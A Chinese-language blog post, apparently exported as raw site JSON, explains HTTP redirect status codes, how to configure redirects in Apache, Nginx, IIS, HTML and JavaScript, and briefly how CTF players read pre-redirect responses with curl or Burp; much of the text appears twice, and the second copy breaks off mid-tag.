title=\"特殊重定向\"></a>特殊重定向</h3><p>除了上述两种常见的重定向之外，还有两种特殊的重定向。<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304\" target=\"_blank\" rel=\"noopener\"><code>304</code></a> （Not Modified，资源未被修改）会使页面跳转到本地陈旧的缓存版本当中（该缓存已过期(?)），而 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/300\" target=\"_blank\" rel=\"noopener\"><code>300</code></a> （Multiple Choice，多项选择） 则是一种手工重定向：以 Web 页面形式呈现在浏览器中的消息主体包含了一个可能的重定向链接的列表，用户可以从中进行选择。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">编码</th>\n<th align=\"left\">含义</th>\n<th align=\"left\">典型应用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>300</code></td>\n<td align=\"left\"><code>Multiple Choice</code></td>\n<td align=\"left\">不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link\" target=\"_blank\" rel=\"noopener\"><code>Link</code></a> 头部加入机器可读的 <code>rel=alternate</code></td>\n</tr>\n<tr>\n<td align=\"left\"><code>304</code></td>\n<td align=\"left\"><code>Not Modified</code></td>\n<td align=\"left\">发送用于重新验证的条件请求。表示缓存的响应仍然是新鲜的并且可以使用。</td>\n</tr>\n</tbody></table>\n<h2 id=\"设置重定向的方法\"><a href=\"#设置重定向的方法\" class=\"headerlink\" title=\"设置重定向的方法\"></a>设置重定向的方法</h2><h3 id=\"1-在服务器中设置重定向\"><a href=\"#1-在服务器中设置重定向\" class=\"headerlink\" title=\"1.在服务器中设置重定向\"></a>1.在服务器中设置重定向</h3><h4 id=\"Apache\"><a href=\"#Apache\" class=\"headerlink\" title=\"Apache\"></a>Apache</h4><p>重定向映射可以在服务器的配置文件中设置，也可以在每一个文件目录的 .htaccess 文件中设置。</p>\n<p>在配置文件中：</p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_alias.html\" target=\"_blank\" rel=\"noopener\">mod_alias</a> 模块提供了 <code>Redirect</code> 和 <code>Redirect_Match</code> 两种指令来设置 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302\" target=\"_blank\" rel=\"noopener\"><code>302</code></a> 响应（默认值）：</p>\n<pre><code>&lt;VirtualHost *:443&gt;\n    ServerName example.com\n    Redirect / https://www.example.com\n&lt;/VirtualHost&gt;</code></pre><p>URL <code>https://example.com/</code> 会被重定向至 <code>https://www.example.com/</code> ，URL 下的任何文件或目录也将重定向到该 URL（<code>https://example.com/some-page</code> 将重定向至 <code>https://www.example.com/some-page</code>）。</p>\n<p><code>Redirect_Match</code> 指令的功能与之类似，不同之处在于它可以通过<a href=\"https://wiki.developer.mozilla.org/en-US/docs/Glossary/Regular_expression\" target=\"_blank\" rel=\"noopener\">正则表达式</a>来指定一批受影响的 URL ：</p>\n<pre><code>RedirectMatch ^/images/(.*)$ http://images.example.com/$1</code></pre><p>位于 <code>images/</code> 文件夹下的所有文档都会被重定向至新的域名。</p>\n<p>如果你不想要设置临时跳转，那么可是使用额外的参数（使用 HTTP 状态码或者 permanent 关键字）来进行设置：</p>\n<pre><code>Redirect permanent / https://www.example.com\n# …acts the same as:\nRedirect 301 / https://www.example.com</code></pre><p><a href=\"http://httpd.apache.org/docs/current/mod/mod_rewrite.html\" target=\"_blank\" rel=\"noopener\">mod_rewrite</a> 模块也可以用来设置重定向映射。它应用起来更灵活，但也更加复杂。</p>\n<h4 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h4><p>在 Nginx 的配置文件中，编辑或创建一个服务器模块来进行重定向设置：</p>\n<pre><code>server {\n    listen 80;\n    server_name example.com;\n    return 301 $scheme://www.example.com$request_uri;\n}</code></pre><p>可以使用 rewrite 指令来针对一个文件目录或者一部分页面应用重定向设置：</p>\n<pre><code>rewrite ^/images/(.*)$ http://images.example.com/$1 redirect;\nrewrite ^/images/(.*)$ http://images.example.com/$1 permanent;</code></pre><h4 id=\"IIS\"><a href=\"#IIS\" class=\"headerlink\" title=\"IIS\"></a>IIS</h4><p>在 IIS 中，可以使用 <code>&lt;httpRedirect&gt;</code> 元素来配置重定向映射。</p>\n<h2 id=\"其它方法设置重定向\"><a href=\"#其它方法设置重定向\" class=\"headerlink\" title=\"其它方法设置重定向\"></a>其它方法设置重定向</h2><p>HTTP 协议中重定向机制并非唯一的重定向映射的方式。其他两种方法包括：</p>\n<ol>\n<li>借助 HTML 的 meta 元素的 HTML 重定向机制</li>\n<li>借助 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model\" target=\"_blank\" rel=\"noopener\">DOM</a> 的 JavaScript 重定向机制。</li>\n</ol>\n<h3 id=\"HTML-重定向机制\"><a href=\"#HTML-重定向机制\" class=\"headerlink\" title=\"HTML 重定向机制\"></a>HTML 重定向机制</h3><p>HTTP 协议中重定向机制是应该优先采用的创建重定向映射的方式，但是有时候 Web 开发者对于服务器没有控制权，或者无法对其进行配置。针对这些特定的应用情景，Web 开发者可以在精心制作的 HTML 页面的<code>head</code>部分添加一个<code>meta</code> 元素，并将其 <code>http-equiv</code> 属性的值设置为 <code>refresh</code> 。当显示页面的时候，浏览器会检测该元素，然后跳转到指定的页面。</p>\n<pre><code>&lt;head&gt;\n  &lt;meta http-equiv=\"Refresh\" content=\"0; URL=http://example.com/\" /&gt;\n&lt;/head&gt;</code></pre><p><code>content</code> 属性的值开头是一个数字，指示浏览器在等待该数字表示的秒数之后再进行跳转。建议始终将其设置为 0 来获取更好的可访问性。</p>\n<p>显然，该方法仅适用于 HTML 页面（或类似的页面），然而并不能应用于图片或者其他类型的内容。</p>\n<p>注意这种机制会使浏览器的回退按钮失效：可以返回含有这个头部的页面，但是又会立即跳转。</p>\n<h3 id=\"JavaScript-重定向机制\"><a href=\"#JavaScript-重定向机制\" class=\"headerlink\" title=\"JavaScript 重定向机制\"></a>JavaScript 重定向机制</h3><p>在 JavaScript 中，重定向机制的原理是设置 <code>window.location</code> 的属性值，然后加载新的页面。</p>\n<pre><code>window.location = \"http://example.com/\";</code></pre><p>与 HTML 重定向机制类似，这种方式并不适用于所有类型的资源，并且显然只有在支持 JavaScript 的客户端上才能使用。另外一方面，它也提供了更多的可能性，比如在只有满足了特定的条件的情况下才可以触发重定向机制的场景。</p>\n<h3 id=\"优先级\"><a href=\"#优先级\" class=\"headerlink\" title=\"优先级\"></a>优先级</h3><p>由于存在上述三种 URL 重定向机制，那么在多种方法同时设定的情况下，哪种方法会首先起作用呢？优先级顺序如下：</p>\n<ol>\n<li>HTTP 协议的重定向机制永远最先触发，即便是在没有传送任何页面——也就没有页面被（客户端）读取——的情况下。</li>\n<li>HTML 的重定向机制 <code>meta</code> 会在 HTTP 协议重定向机制未设置的情况下触发。</li>\n<li>JavaScript 的重定向机制总是作为最后诉诸的手段，并且只有在客户端开启了 JavaScript 的情况下才起作用。</li>\n</ol>\n<p>任何情况下，只要有可能，就应该采用 HTTP 协议的重定向机制，而不要使用 <code>meta</code>标签。假如开发人员修改了 HTTP 重定向映射而忘记修改 HTML 页面的重定向映射，那么二者就会不一致，最终结果或者出现无限循环，或者导致其他严重事故的发生。</p>\n<h2 id=\"应用场景\"><a href=\"#应用场景\" class=\"headerlink\" title=\"应用场景\"></a>应用场景</h2><p>有以下几种应用场景可以使用重定向机制，但是需要注意应该尽可能地限制其使用数量，因为每一次重定向都会降低使用效率。</p>\n<h3 id=\"域名别称\"><a href=\"#域名别称\" class=\"headerlink\" title=\"域名别称\"></a>域名别称</h3><p>理想情况下，一项资源只有一个访问位置，也就是只有一个 URL 。但是由于种种原因，需要为资源设定不同的名称（即不同的域名，例如带有和不带有 www 前缀的URL，以及简短易记的 URL 等）。在这种情况下，实用的方法是将其重定向到那个实际的（标准的）URL，而不是复制资源。</p>\n<p>在以下几种情况下可以使用域名别称：</p>\n<ul>\n<li><p><strong>扩大站点的用户覆盖面</strong></p>\n<p>一个常见的场景是，假如站点位于 <code>www.example.com</code> 域名下，那么通过 <code>example.com</code>也应该可以访问到。这种情况下，可以建立从 <code>example.com</code> 的页面到 <code>www.example.com</code> 的重定向映射。此外还可以提供常见的同义词，或者该域名容易导致的拼写错误的域名别称。</p>\n</li>\n<li><p><strong>迁移到另外一个域名</strong></p>\n<p>例如，公司改名后，你希望用户在搜索旧名称的时候，依然可以访问到应用了新名称的站点。</p>\n</li>\n<li><p><strong>强制使用 HTTPS 协议</strong></p>\n<p>对于 HTTP 版本站点的请求会被重定向至采用了 HTTPS 协议的版本。</p>\n</li>\n<li><p><strong>保持链接有效</strong></p>\n</li>\n</ul>\n<p>当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你可以更新站点内部的链接来适应新的命名体系，但无法控制被外部资源使用的 URL 。</p>\n<p>你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户（并且帮助优化你的SEO），所以需要建立从旧链接到新链接的重定向映射。</p>\n<p>即便是这项技术可以同样应用于内部链接，但是应该尽量避免内部重定向映射。重定向机制会带来相当大的性能开销（额外的 HTTP 请求），所以如果你可以通过修复链接来避免的话，那么就应该将其修复。</p>\n<h3 id=\"对于不安全请求的临时响应\"><a href=\"#对于不安全请求的临时响应\" class=\"headerlink\" title=\"对于不安全请求的临时响应\"></a>对于不安全请求的临时响应</h3><p>不安全请求会修改服务器端的状态，应该避免用户无意的重复操作。</p>\n<p>通常，你并不想要你的用户重复发送  PUT、POST 或 DELETE 请求。假如你仅仅为该类请求返回响应的话，简单地点击刷新按钮就会（可能会有一个确认信息）导致请求的重复发送。</p>\n<p>在这种情况下，服务器可以返回一个 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303\" target=\"_blank\" rel=\"noopener\"><code>303</code></a> (See Other) 响应，其中含有合适的响应信息。如果刷新按钮被点击的话，只会导致该页面被刷新，而不会重复提交不安全的请求。</p>\n<h3 id=\"对于耗时请求的临时响应\"><a href=\"#对于耗时请求的临时响应\" class=\"headerlink\" title=\"对于耗时请求的临时响应\"></a>对于耗时请求的临时响应</h3><p>一些请求的处理会需要比较长的时间，比如有时候 DELETE 请求会被安排为稍后处理。在这种情况下，会返回一个 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303\" target=\"_blank\" rel=\"noopener\"><code>303</code></a> (See Other)  重定向响应，该响应链接到一个页面，表示请求的操作已经被列入计划，并且最终会通知用户操作的进展情况，或者允许用户将其取消。</p>\n<h2 id=\"在CTF中的应用\"><a href=\"#在CTF中的应用\" class=\"headerlink\" title=\"在CTF中的应用\"></a>在CTF中的应用</h2><h3 id=\"使用curl工具\"><a href=\"#使用curl工具\" class=\"headerlink\" title=\"使用curl工具\"></a>使用curl工具</h3><p>如果需要获得跳转前的页面中的信息，使用curl命令行工具是非常常见的，因为curl默认是不跟随跳转的，除非添加了-L参数才会跟随跳转。</p>\n<h3 id=\"使用bp抓包\"><a href=\"#使用bp抓包\" class=\"headerlink\" title=\"使用bp抓包\"></a>使用bp抓包</h3><p>这个方法也很简单，抓包，放入Repeater模块，发送过去就行了，它会把服务器发过来的包都截下来的，因为重定向是由浏览器执行的，所以信息都仍然保留在服务器回复的报文里。</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"HTTP重定向以及在CTF中的应用\"><a href=\"#HTTP重定向以及在CTF中的应用\" class=\"headerlink\" title=\"HTTP重定向以及在CTF中的应用\"></a>HTTP重定向以及在CTF中的应用</h1><blockquote>\n<p>URL 重定向，也称为 URL 转发，是一种当实际资源，如单个页面、表单或者整个 Web 应用被迁移到新的 URL 下的时候，保持（原有）链接可用的技术。HTTP 协议提供了一种特殊形式的响应—— HTTP 重定向（HTTP redirects   响应码300系列）来执行此类操作。</p>\n</blockquote>\n<p>网页重定向可实现许多目标：</p>\n<ul>\n<li>站点维护或停机期间的临时重定向。</li>\n<li>永久重定向将在更改站点的URL，上传文件时的进度页等之后保留现有的链接/书签。</li>\n<li>作为上传文件时的表示进度的页面。</li>\n</ul>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>在 HTTP 协议中，重定向操作由服务器通过发送特殊的响应（即 redirects）而触发。HTTP 协议的重定向响应的状态码为 3xx 。</p>\n<p>浏览器在接收到重定向响应的时候，会采用该响应提供的新的 URL ，并立即进行加载，要注意的是，<strong>跳转是由浏览器完成的，所以给非浏览器客户端发送跳转信息是可能发生错误的</strong></p>\n<p>大多数情况下，除了会有一小部分性能损失之外，重定向操作对于用户来说是不可见的。</p>\n<p><img src=\"https://mdn.mozillademos.org/files/13785/HTTPRedirect.png\" alt=\"img\"></p>\n<p>不同类型的重定向映射可以划分为三个类别：</p>\n<ol>\n<li>永久重定向</li>\n<li>临时重定向</li>\n<li>特殊重定向</li>\n</ol>\n<h3 id=\"永久重定义\"><a href=\"#永久重定义\" class=\"headerlink\" title=\"永久重定义\"></a>永久重定义</h3><p>这种重定向操作是永久性的。它表示原 URL 不应再被使用，而应该优先选用新的 URL。搜索引擎机器人会在遇到该状态码时触发更新操作，在其索引库中修改与该资源相关的 URL 。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">编码</th>\n<th align=\"left\">含义</th>\n<th align=\"left\">处理方法</th>\n<th align=\"left\">典型应用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>301</code></td>\n<td align=\"left\">Moved Permanently</td>\n<td align=\"left\"><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET\" target=\"_blank\" rel=\"noopener\"><code>GET</code></a> 方法不会发生变更，其他方法有可能会变更为 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET\" target=\"_blank\" rel=\"noopener\"><code>GET</code></a> 方法。</td>\n<td align=\"left\">网站重构。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>308</code></td>\n<td align=\"left\">Permanent Redirect</td>\n<td align=\"left\">方法和消息主体都不发生变化。</td>\n<td align=\"left\">网站重构，用于非GET方法。</td>\n</tr>\n</tbody></table>\n<h3 id=\"临时重定向\"><a href=\"#临时重定向\" class=\"headerlink\" title=\"临时重定向\"></a>临时重定向</h3><p>有时候请求的资源无法从其标准地址访问，但是却可以从另外的地方访问。在这种情况下可以使用临时重定向。</p>\n<p>搜索引擎不会记录该新的、临时的链接。在创建、更新或者删除资源的时候，临时重定向也可以用于显示临时性的进度页面。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">编码</th>\n<th align=\"left\">含义</th>\n<th align=\"left\">处理方法</th>\n<th align=\"left\">典型应用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>302</code></td>\n<td align=\"left\"><code>Found</code></td>\n<td align=\"left\">GET 方法不会发生变更，其他方法有可能会变更为 GET 方法。</td>\n<td align=\"left\">由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>303</code></td>\n<td align=\"left\"><code>See Other</code></td>\n<td align=\"left\">GET 方法不会发生变更，其他方法会<strong>变更</strong>为 GET 方法（消息主体会丢失）。</td>\n<td align=\"left\">用于PUT 或 POST 请求完成之后进行页面跳转来防止由于页面刷新导致的操作的重复触发。</td>\n</tr>\n<tr>\n<td align=\"left\"><code>307</code></td>\n<td align=\"left\"><code>Temporary Redirect</code></td>\n<td align=\"left\">方法和消息主体都不发生变化。</td>\n<td align=\"left\">由于不可预见的原因该页面暂不可用。在这种情况下，搜索引擎不会更新它们的链接。当站点支持非 GET 方法的链接或操作的时候，该状态码优于 302 状态码。</td>\n</tr>\n</tbody></table>\n<p>该规范无意使方法发生改变，但在实际应用中用户代理会这么做。 307 状态码被创建用来消除在使用非 GET 方法时的歧义行为。</p>\n<h3 id=\"特殊重定向\"><a href=\"#特殊重定向\" class=\"headerlink\" title=\"特殊重定向\"></a>特殊重定向</h3><p>除了上述两种常见的重定向之外，还有两种特殊的重定向。<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304\" target=\"_blank\" rel=\"noopener\"><code>304</code></a> （Not Modified，资源未被修改）会使页面跳转到本地陈旧的缓存版本当中（该缓存已过期(?)），而 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/300\" target=\"_blank\" rel=\"noopener\"><code>300</code></a> （Multiple Choice，多项选择） 则是一种手工重定向：以 Web 页面形式呈现在浏览器中的消息主体包含了一个可能的重定向链接的列表，用户可以从中进行选择。</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">编码</th>\n<th align=\"left\">含义</th>\n<th align=\"left\">典型应用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>300</code></td>\n<td align=\"left\"><code>Multiple Choice</code></td>\n<td align=\"left\">不常用：所有的选项在消息主体的 HTML 页面中列出。鼓励在 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Link\" target=\"_blank\" rel=\"noopener\"><code>Link</code></a> 头部加入机器可读的 <code>rel=alternate</code></td>\n</tr>\n<tr>\n<td align=\"left\"><code>304</code></td>\n<td align=\"left\"><code>Not Modified</code></td>\n<td align=\"left\">发送用于重新验证的条件请求。表示缓存的响应仍然是新鲜的并且可以使用。</td>\n</tr>\n</tbody></table>\n<h2 id=\"设置重定向的方法\"><a href=\"#设置重定向的方法\" class=\"headerlink\" title=\"设置重定向的方法\"></a>设置重定向的方法</h2><h3 id=\"1-在服务器中设置重定向\"><a href=\"#1-在服务器中设置重定向\" class=\"headerlink\" title=\"1.在服务器中设置重定向\"></a>1.在服务器中设置重定向</h3><h4 id=\"Apache\"><a href=\"#Apache\" class=\"headerlink\" title=\"Apache\"></a>Apache</h4><p>重定向映射可以在服务器的配置文件中设置，也可以在每一个文件目录的 .htaccess 文件中设置。</p>\n<p>在配置文件中：</p>\n<p><a href=\"https://httpd.apache.org/docs/current/mod/mod_alias.html\" target=\"_blank\" rel=\"noopener\">mod_alias</a> 模块提供了 <code>Redirect</code> 和 <code>Redirect_Match</code> 两种指令来设置 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/302\" target=\"_blank\" rel=\"noopener\"><code>302</code></a> 响应（默认值）：</p>\n<pre><code>&lt;VirtualHost *:443&gt;\n    ServerName example.com\n    Redirect / https://www.example.com\n&lt;/VirtualHost&gt;</code></pre><p>URL <code>https://example.com/</code> 会被重定向至 <code>https://www.example.com/</code> ，URL 下的任何文件或目录也将重定向到该 URL（<code>https://example.com/some-page</code> 将重定向至 <code>https://www.example.com/some-page</code>）。</p>\n<p><code>Redirect_Match</code> 指令的功能与之类似，不同之处在于它可以通过<a href=\"https://wiki.developer.mozilla.org/en-US/docs/Glossary/Regular_expression\" target=\"_blank\" rel=\"noopener\">正则表达式</a>来指定一批受影响的 URL ：</p>\n<pre><code>RedirectMatch ^/images/(.*)$ http://images.example.com/$1</code></pre><p>位于 <code>images/</code> 文件夹下的所有文档都会被重定向至新的域名。</p>\n<p>如果你不想要设置临时跳转，那么可是使用额外的参数（使用 HTTP 状态码或者 permanent 关键字）来进行设置：</p>\n<pre><code>Redirect permanent / https://www.example.com\n# …acts the same as:\nRedirect 301 / https://www.example.com</code></pre><p><a href=\"http://httpd.apache.org/docs/current/mod/mod_rewrite.html\" target=\"_blank\" rel=\"noopener\">mod_rewrite</a> 模块也可以用来设置重定向映射。它应用起来更灵活，但也更加复杂。</p>\n<h4 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h4><p>在 Nginx 的配置文件中，编辑或创建一个服务器模块来进行重定向设置：</p>\n<pre><code>server {\n    listen 80;\n    server_name example.com;\n    return 301 $scheme://www.example.com$request_uri;\n}</code></pre><p>可以使用 rewrite 指令来针对一个文件目录或者一部分页面应用重定向设置：</p>\n<pre><code>rewrite ^/images/(.*)$ http://images.example.com/$1 redirect;\nrewrite ^/images/(.*)$ http://images.example.com/$1 permanent;</code></pre><h4 id=\"IIS\"><a href=\"#IIS\" class=\"headerlink\" title=\"IIS\"></a>IIS</h4><p>在 IIS 中，可以使用 <code>&lt;httpRedirect&gt;</code> 元素来配置重定向映射。</p>\n<h2 id=\"其它方法设置重定向\"><a href=\"#其它方法设置重定向\" class=\"headerlink\" title=\"其它方法设置重定向\"></a>其它方法设置重定向</h2><p>HTTP 协议中重定向机制并非唯一的重定向映射的方式。其他两种方法包括：</p>\n<ol>\n<li>借助 HTML 的 meta 元素的 HTML 重定向机制</li>\n<li>借助 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model\" target=\"_blank\" rel=\"noopener\">DOM</a> 的 JavaScript 重定向机制。</li>\n</ol>\n<h3 id=\"HTML-重定向机制\"><a href=\"#HTML-重定向机制\" class=\"headerlink\" title=\"HTML 重定向机制\"></a>HTML 重定向机制</h3><p>HTTP 协议中重定向机制是应该优先采用的创建重定向映射的方式，但是有时候 Web 开发者对于服务器没有控制权，或者无法对其进行配置。针对这些特定的应用情景，Web 开发者可以在精心制作的 HTML 页面的<code>head</code>部分添加一个<code>meta</code> 元素，并将其 <code>http-equiv</code> 属性的值设置为 <code>refresh</code> 。当显示页面的时候，浏览器会检测该元素，然后跳转到指定的页面。</p>\n<pre><code>&lt;head&gt;\n  &lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0; URL=http://example.com/&quot; /&gt;\n&lt;/head&gt;</code></pre><p><code>content</code> 属性的值开头是一个数字，指示浏览器在等待该数字表示的秒数之后再进行跳转。建议始终将其设置为 0 来获取更好的可访问性。</p>\n<p>显然，该方法仅适用于 HTML 页面（或类似的页面），然而并不能应用于图片或者其他类型的内容。</p>\n<p>注意这种机制会使浏览器的回退按钮失效：可以返回含有这个头部的页面，但是又会立即跳转。</p>\n<h3 id=\"JavaScript-重定向机制\"><a href=\"#JavaScript-重定向机制\" class=\"headerlink\" title=\"JavaScript 重定向机制\"></a>JavaScript 重定向机制</h3><p>在 JavaScript 中，重定向机制的原理是设置 <code>window.location</code> 的属性值，然后加载新的页面。</p>\n<pre><code>window.location = &quot;http://example.com/&quot;;</code></pre><p>与 HTML 重定向机制类似，这种方式并不适用于所有类型的资源，并且显然只有在支持 JavaScript 的客户端上才能使用。另外一方面，它也提供了更多的可能性，比如在只有满足了特定的条件的情况下才可以触发重定向机制的场景。</p>\n<h3 id=\"优先级\"><a href=\"#优先级\" class=\"headerlink\" title=\"优先级\"></a>优先级</h3><p>由于存在上述三种 URL 重定向机制，那么在多种方法同时设定的情况下，哪种方法会首先起作用呢？优先级顺序如下：</p>\n<ol>\n<li>HTTP 协议的重定向机制永远最先触发，即便是在没有传送任何页面——也就没有页面被（客户端）读取——的情况下。</li>\n<li>HTML 的重定向机制 <code>meta</code> 会在 HTTP 协议重定向机制未设置的情况下触发。</li>\n<li>JavaScript 的重定向机制总是作为最后诉诸的手段，并且只有在客户端开启了 JavaScript 的情况下才起作用。</li>\n</ol>\n<p>任何情况下，只要有可能，就应该采用 HTTP 协议的重定向机制，而不要使用 <code>meta</code>标签。假如开发人员修改了 HTTP 重定向映射而忘记修改 HTML 页面的重定向映射，那么二者就会不一致，最终结果或者出现无限循环，或者导致其他严重事故的发生。</p>\n<h2 id=\"应用场景\"><a href=\"#应用场景\" class=\"headerlink\" title=\"应用场景\"></a>应用场景</h2><p>有以下几种应用场景可以使用重定向机制，但是需要注意应该尽可能地限制其使用数量，因为每一次重定向都会降低使用效率。</p>\n<h3 id=\"域名别称\"><a href=\"#域名别称\" class=\"headerlink\" title=\"域名别称\"></a>域名别称</h3><p>理想情况下，一项资源只有一个访问位置，也就是只有一个 URL 。但是由于种种原因，需要为资源设定不同的名称（即不同的域名，例如带有和不带有 www 前缀的URL，以及简短易记的 URL 等）。在这种情况下，实用的方法是将其重定向到那个实际的（标准的）URL，而不是复制资源。</p>\n<p>在以下几种情况下可以使用域名别称：</p>\n<ul>\n<li><p><strong>扩大站点的用户覆盖面</strong></p>\n<p>一个常见的场景是，假如站点位于 <code>www.example.com</code> 域名下，那么通过 <code>example.com</code>也应该可以访问到。这种情况下，可以建立从 <code>example.com</code> 的页面到 <code>www.example.com</code> 的重定向映射。此外还可以提供常见的同义词，或者该域名容易导致的拼写错误的域名别称。</p>\n</li>\n<li><p><strong>迁移到另外一个域名</strong></p>\n<p>例如，公司改名后，你希望用户在搜索旧名称的时候，依然可以访问到应用了新名称的站点。</p>\n</li>\n<li><p><strong>强制使用 HTTPS 协议</strong></p>\n<p>对于 HTTP 版本站点的请求会被重定向至采用了 HTTPS 协议的版本。</p>\n</li>\n<li><p><strong>保持链接有效</strong></p>\n</li>\n</ul>\n<p>当你重构 Web 站点的时候，资源的 URL 会发生改变。即便是你可以更新站点内部的链接来适应新的命名体系，但无法控制被外部资源使用的 URL 。</p>\n<p>你并不想因此而使旧链接失效，因为它们会为你带来宝贵的用户（并且帮助优化你的SEO），所以需要建立从旧链接到新链接的重定向映射。</p>\n<p>即便是这项技术可以同样应用于内部链接，但是应该尽量避免内部重定向映射。重定向机制会带来相当大的性能开销（额外的 HTTP 请求），所以如果你可以通过修复链接来避免的话，那么就应该将其修复。</p>\n<h3 id=\"对于不安全请求的临时响应\"><a href=\"#对于不安全请求的临时响应\" class=\"headerlink\" title=\"对于不安全请求的临时响应\"></a>对于不安全请求的临时响应</h3><p>不安全请求会修改服务器端的状态，应该避免用户无意的重复操作。</p>\n<p>通常，你并不想要你的用户重复发送  PUT、POST 或 DELETE 请求。假如你仅仅为该类请求返回响应的话，简单地点击刷新按钮就会（可能会有一个确认信息）导致请求的重复发送。</p>\n<p>在这种情况下，服务器可以返回一个 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/303\" target=\"_blank\" rel=\"noopener\"><code>303</code></a> (See Other) 响应，其中含有合适的响应信息。如果刷新按钮被点击的话，只会导致该页面被刷新，而不会重复提交不安全的请求。</p>\n<h3 id=\"对于耗时请求的临时响应\"><a href=\"#对于耗时请求的临时响应\" class=\"headerlink\" 